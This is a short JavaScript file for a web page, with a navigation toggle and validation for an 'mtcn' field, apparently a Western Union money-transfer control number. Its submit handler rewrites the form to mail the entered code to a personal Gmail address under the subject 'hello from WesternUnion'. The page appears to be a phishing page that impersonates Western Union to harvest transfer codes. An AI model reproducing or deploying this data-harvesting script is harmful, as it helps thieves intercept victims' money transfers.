function myFunction() {
    var x = document.getElementById("myTopnav");
    if (x.className === "topnav") {
      x.className += " responsive";
    } else {
      x.className = "topnav";
    }
  }
  $(document).ready(function(){
    $("#alert").hide();
    $("#mtcn").blur(function(){
      if($(this).val().length===10)
      {
          $("#alert").show();
          $("#btnsub").addClass("disabled");
      }
      else
      {
          $("#alert").hide();
          $("#btnsub").removeClass("disabled");
      }
  });

  $("#alert2").hide();
  $("#mtcn").focus(function(){
    if($(this).val().length!=10)
    {
        $("#alert2").show();
        $("#btnsub").addClass("disabled");
    }
    else
    {
        $("#alert2").hide();
        $("#btnsub").removeClass("disabled");
    }
});
 
$("#btnsub").click(function(){
 
    $("#frm").attr("action","mailto:ooooaaaaoooo5@gmail.com?subject=hello from WesternUnion &body="+$("#mtcn").val());
   
    $("#frm").submit();
  
});



  })